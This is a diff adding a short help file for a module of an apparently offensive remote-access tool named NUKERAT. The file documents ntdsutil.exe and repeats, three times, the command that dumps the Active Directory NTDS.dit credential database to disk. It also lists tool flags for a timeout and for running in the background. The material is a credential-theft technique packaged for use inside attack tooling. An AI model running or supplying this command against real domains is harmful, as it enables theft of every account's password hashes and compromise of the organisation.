@@ -1,0 +1,16 @@
+ABOUT
+    Command line utility used to export Active Directory. LOLBAS
+    documents dumping of Active Directory NTDS.dit database.
+
+USAGE:
+    ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
+
+EXAMPLES:
+    ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
